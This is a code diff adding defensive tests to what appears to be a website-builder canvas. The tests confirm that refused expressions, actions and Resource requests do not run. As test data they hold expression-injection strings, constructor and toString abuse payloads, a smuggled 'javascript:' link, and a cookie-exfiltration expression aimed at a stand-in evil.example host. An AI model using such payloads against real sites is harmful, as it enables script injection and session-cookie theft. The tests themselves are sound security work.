@@ -8,12 +8,17 @@ import { setEnv } from "@webstudio-is/feature-flags";
 import {
   blockComponent,
   blockTemplateComponent,
+  collectionComponent,
   elementComponent,
+  encodeDataSourceVariable,
   SYSTEM_VARIABLE_ID,
+  type DataSource,
   type Instance,
   type Prop,
 } from "@webstudio-is/sdk";
 import { ReactSdkContext } from "@webstudio-is/react-sdk/runtime";
+import { lintExpression } from "@webstudio-is/expression";
+import { textContentAttribute } from "@webstudio-is/react-sdk";
 import { canvasComponentLibraries } from "@webstudio-is/sdk-components-registry/canvas";
 import {
   $builderMode,
@@ -33,6 +38,7 @@ import {
 } from "~/shared/sync/data-stores";
 import { $selectedPageId } from "~/shared/nano-states/pages";
 import { registerContainers } from "~/shared/sync/sync-stores";
+import { computeResourceRequest } from "~/shared/resources";
 import { createInstanceElement } from "./elements";
 import {
   WebstudioComponentCanvas,
@@ -1993,6 +1999,447 @@ describe.each(renderers)(
     });
   }
 );
+
+// While org script is paused a variable holds plain data only, so no prop
+// named `ref` reaches a component (withoutPausedProps)
+describe.each(renderers)("the %s passes no ref prop", (renderer) => {
+  test("from an expression or a parameter that names a variable", async () => {
+    const held = { current: "plain" };
+    $dataSources.set(
+      new Map<string, DataSource>([
+        [
+          "held",
+          {
+            type: "variable",
+            id: "held",
+            name: "held",
+            scopeInstanceId: "body",
+            value: { type: "json", value: held },
+          },
+        ],
+      ])
+    );
+    $dataSourceVariables.set(new Map());
+    const dom = await render({
+      renderer,
+      instances: [
+        instance({ id: "body", children: ids("bound", "named") }),
+        instance({ id: "bound", tag: "div" }),
+        instance({ id: "named", tag: "div" }),
+      ],
+      props: [
+        [
+          "bound-ref",
+          {
+            id: "bound-ref",
+            instanceId: "bound",
+            name: "ref",
+            type: "expression",
+            value: encodeDataSourceVariable("held"),
+          },
+        ],
+        [
+          "named-ref",
+          {
+            id: "named-ref",
+            instanceId: "named",
+            name: "ref",
+            type: "parameter",
+            value: "held",
+          },
+        ],
+      ],
+    });
+
+    expect(dom.querySelector('[data-ws-id="bound"]')).not.toBeNull();
+    expect(held.current).toBe("plain");
+    for (const value of $dataSourceVariables.get().values()) {
+      expect(value instanceof Element).toBe(false);
+    }
+    $dataSources.set(new Map());
+  });
+});
+
+// While org script is paused the canvas compiles an expression only when
+// expressionMayRun passes it, and computes no function from one
+// (getCompiledExpression and evaluateExpressionSync in
+// packages/project-build/src/runtime/data.ts, docs/ORGANIZEOS-FORK.md
+// section 10). A refused expression has no value, as
+// on the published page.
+describe("the canvas computes an expression", () => {
+  const pwned = () => (window as { pwned?: number }).pwned;
+  const text = encodeDataSourceVariable("text");
+  const events = encodeDataSourceVariable("events");
+  const event = encodeDataSourceVariable("event");
+  const refusedCode = "0) || (globalThis.pwned = 1";
+  // a draft that is not one whole expression
+  const savedCode = 'false) || ("y"';
+
+  const bound = (
+    instanceId: string,
+    name: string,
+    value: string
+  ): [string, Prop] => {
+    const id = `${instanceId}:${name}`;
+    return [id, { id, instanceId, name, type: "expression", value }];
+  };
+  const parameter = (
+    instanceId: string,
+    name: string,
+    value: string
+  ): [string, Prop] => {
+    const id = `${instanceId}:${name}`;
+    return [id, { id, instanceId, name, type: "parameter", value }];
+  };
+
+  const instances = [
+    instance({
+      id: "body",
+      children: ids(
+        "title",
+        "text",
+        "shown",
+        "list",
+        "saved",
+        "handler",
+        "cards"
+      ),
+    }),
+    instance({ id: "title" }),
+    instance({
+      id: "text",
+      tag: "p",
+      children: [{ type: "expression", value: refusedCode }],
+    }),
+    instance({ id: "shown" }),
+    instance({
+      id: "list",
+      component: collectionComponent,
+      children: ids("listItem"),
+    }),
+    instance({ id: "listItem" }),
+    instance({ id: "saved" }),
+    instance({ id: "handler", tag: "button" }),
+    // an Event List's collection and a card that reads its item
+    instance({
+      id: "cards",
+      component: collectionComponent,
+      children: ids("card"),
+    }),
+    instance({
+      id: "card",
+      tag: "h3",
+      children: [{ type: "expression", value: `${event}.title` }],
+    }),
+  ];
+
+  const props = [
+    bound("title", "title", refusedCode),
+    bound("shown", "data-ws-show", refusedCode),
+    bound("list", "data", refusedCode),
+    parameter("list", "item", "item"),
+    bound("saved", "title", savedCode),
+    // a method read as a value
+    bound("handler", "onClick", `${text}.slice`),
+    bound(
+      "cards",
+      "data",
+      `(${events}.ok === true ? ${events}.data.data : [])`
+    ),
+    parameter("cards", "item", "event"),
+  ];
+
+  const valuesOf = (...instanceSelector: string[]) =>
+    $propValuesByInstanceSelector
+      .get()
+      .get(getInstanceKey([...instanceSelector, "body"]));
+
+  beforeEach(() => {
+    (window as { pwned?: number }).pwned = undefined;
+    $dataSources.set(
+      new Map<string, DataSource>([
+        [
+          "text",
+          {
+            type: "variable",
+            id: "text",
+            name: "text",
+            scopeInstanceId: "body",
+            value: { type: "string", value: "abc" },
+          },
+        ],
+        [
+          "events",
+          {
+            type: "variable",
+            id: "events",
+            name: "events",
+            scopeInstanceId: "body",
+            value: {
+              type: "json",
+              value: { ok: true, data: { data: [{ title: "Rally" }] } },
+            },
+          },
+        ],
+        [
+          "item",
+          {
+            type: "parameter",
+            id: "item",
+            name: "item",
+            scopeInstanceId: "list",
+          },
+        ],
+        [
+          "event",
+          {
+            type: "parameter",
+            id: "event",
+            name: "event",
+            scopeInstanceId: "cards",
+          },
+        ],
+      ])
+    );
+    $dataSourceVariables.set(new Map());
+  });
+
+  afterEach(() => {
+    cleanStores($propValuesByInstanceSelector);
+  });
+
+  test("runs none of the refused expressions, and gives them no value", async () => {
+    await settled(() => {
+      prepare({ instances, props });
+    });
+
+    expect(pwned()).toBeUndefined();
+    expect(valuesOf("title")?.has("title")).toBe(false);
+    expect(valuesOf("text")?.has(textContentAttribute)).toBe(false);
+    expect(valuesOf("shown")?.has("data-ws-show")).toBe(false);
+    expect(valuesOf("saved")?.has("title")).toBe(false);
+    // a Collection with no data renders nothing
+    expect(valuesOf("list")?.has("data")).toBe(false);
+    expect(
+      [...$propValuesByInstanceSelector.get().keys()].some((key) =>
+        key.includes("listItem")
+      )
+    ).toBe(false);
+  });
+
+  // One complete expression the linter accepts may still read a member it may
+  // not read
+  const lintClean = '"x".constructor.name';
+
+  test("runs no complete expression the linter accepts that may not run, and gives it no value", async () => {
+    expect(lintExpression({ expression: lintClean })).toEqual([]);
+    await settled(() =>
+      prepare({
+        instances: [
+          instance({ id: "body", children: ids("title", "text", "shown") }),
+          instance({ id: "title" }),
+          instance({
+            id: "text",
+            tag: "p",
+            children: [{ type: "expression", value: lintClean }],
+          }),
+          instance({ id: "shown" }),
+        ],
+        props: [
+          bound("title", "title", lintClean),
+          bound("title", "data-member", `${text}.constructor.name`),
+          // no comment, inside an expression either
+          bound("title", "data-comment", `${text} /* x */ .length`),
+          // input validation passes these: the pause's rule refuses them
+          bound("title", "data-call", `${text}.slice(${text})`),
+          bound("title", "data-key", "({ toString: 1 })"),
+          bound("shown", "data-ws-show", lintClean),
+        ],
+      })
+    );
+
+    expect(valuesOf("title")?.has("title")).toBe(false);
+    expect(valuesOf("title")?.has("data-member")).toBe(false);
+    expect(valuesOf("title")?.has("data-comment")).toBe(false);
+    expect(valuesOf("title")?.has("data-call")).toBe(false);
+    expect(valuesOf("title")?.has("data-key")).toBe(false);
+    expect(valuesOf("text")?.has(textContentAttribute)).toBe(false);
+    expect(valuesOf("shown")?.has("data-ws-show")).toBe(false);
+  });
+
+  // Input validation (code-check.ts) is the outer layer, and what either
+  // refuses has no value on the canvas (which reason the evaluator gives is
+  // in project-build's data.organizeos.test.ts)
+  test("gives what input validation refuses no value, as what the pause's rule refuses", async () => {
+    await settled(() =>
+      prepare({
+        instances: [
+          instance({ id: "body", children: ids("title") }),
+          instance({ id: "title" }),
+        ],
+        props: [
+          bound("title", "title", '({constructor: "order"})'),
+          bound("title", "data-angle", "0 < 1 > 2"),
+        ],
+      })
+    );
+
+    expect(valuesOf("title")?.has("title")).toBe(false);
+    expect(valuesOf("title")?.has("data-angle")).toBe(false);
+  });
+
+  // A link's address holds no object whose keys the rule refuses
+  test("gives a link no address from an object with a key the rule refuses", async () => {
+    const stateful =
+      '({toString: [].shift, length: 2, 0: "https://ok.example/", 1: "javascript:void 0"})';
+    await settled(() =>
+      prepare({
+        instances: [
+          instance({ id: "body", children: ids("link") }),
+          instance({ id: "link", tag: "a" }),
+        ],
+        props: [bound("link", "href", stateful)],
+      })
+    );
+
+    expect(valuesOf("link")?.has("href")).toBe(false);
+  });
+
+  test("requests a Resource without a field the linter accepts that may not run", async () => {
+    const request = await computeResourceRequest(
+      {
+        id: "resource",
+        name: "resource",
+        method: "get",
+        url: lintClean,
+        headers: [{ name: "x", value: lintClean }],
+      },
+      new Map()
+    );
+
+    expect(request.url).toBeUndefined();
+    expect(request.headers).toEqual([{ name: "x", value: undefined }]);
+  });
+
+  test("computes no function", async () => {
+    await settled(() => {
+      prepare({ instances, props });
+    });
+
+    expect(valuesOf("handler")?.has("onClick")).toBe(false);
+  });
+
+  test("computes an Event List's bind and a Collection's item as before", async () => {
+    await settled(() => {
+      prepare({ instances, props });
+    });
+
+    expect(valuesOf("cards")?.get("data")).toEqual([{ title: "Rally" }]);
+    expect(
+      [...$propValuesByInstanceSelector.get().values()].map((values) =>
+        values.get(textContentAttribute)
+      )
+    ).toContain("Rally");
+  });
+
+  test("requests a Resource without a field that may not run", async () => {
+    const request = await computeResourceRequest(
+      {
+        id: "resource",
+        name: "resource",
+        method: "post",
+        url: refusedCode,
+        searchParams: [{ name: "q", value: refusedCode }],
+        headers: [
+          { name: "x", value: refusedCode },
+          { name: "y", value: '"kept"' },
+        ],
+        body: refusedCode,
+      },
+      new Map()
+    );
+
+    expect(pwned()).toBeUndefined();
+    expect(request.url).toBeUndefined();
+    expect(request.searchParams).toEqual([{ name: "q", value: undefined }]);
+    expect(request.headers).toEqual([
+      { name: "x", value: undefined },
+      { name: "y", value: "kept" },
+    ]);
+    expect(request.body).toBeUndefined();
+  });
+
+  // While org script is paused an action names its args only where its
+  // component passes plain data, so no event reaches a variable, and an
+  // expression that reads a host object through one reads nothing
+  // (docs/ORGANIZEOS-FORK.md section 10, Actions)
+  test.each(renderers)(
+    "an action that stores its event stores no host object, so an expression that reads one reads nothing, in the %s",
+    async (renderer) => {
+      const stored = encodeDataSourceVariable("stored");
+      document.cookie = "session=SECRET";
+      $dataSources.set(
+        new Map<string, DataSource>([
+          [
+            "stored",
+            {
+              type: "variable",
+              id: "stored",
+              name: "stored",
+              scopeInstanceId: "body",
+              value: { type: "string", value: "" },
+            },
+          ],
+        ])
+      );
+      const instances = [
+        instance({ id: "body", children: ids("button", "image") }),
+        instance({ id: "button", tag: "button" }),
+        instance({ id: "image", tag: "img" }),
+      ];
+      const props: Array<[string, Prop]> = [
+        [
+          "button:onClick",
+          {
+            id: "button:onClick",
+            instanceId: "button",
+            name: "onClick",
+            type: "action",
+            value: [
+              { type: "execute", args: ["event"], code: `${stored} = event` },
+            ],
+          },
+        ],
+        bound(
+          "image",
+          "src",
+          `"https://evil.example/c?" + ${stored}.view.document.cookie`
+        ),
+      ];
+
+      // a button passes its action an event, so the action may not name it
+      await settled(() => {
+        prepare({ instances, props });
+      });
+      expect(valuesOf("button")?.get("onClick")).toBeUndefined();
+
+      const dom = await render({ renderer, instances, props });
+      act(() => {
+        dom.querySelector<HTMLElement>('[data-ws-id="button"]')?.click();
+      });
+      const storedValue = $dataSourceVariables.get().get("stored");
+      expect(
+        storedValue === window ||
+          (storedValue as { view?: unknown } | undefined)?.view === window
+      ).toBe(false);
+      // the expression is computed, and reads nothing
+      const src =
+        dom.querySelector('[data-ws-id="image"]')?.getAttribute("src") ?? "";
+      expect(src).toMatch(/^https:\/\/evil\.example\/c\?/);
+      expect(src).not.toContain("SECRET");
+    }
+  );
+});
 
 // Inside a link, an SVG animate or set sets the link's href by SMIL, past the
 // address check, and a click in preview runs it. The canvas makes neither,
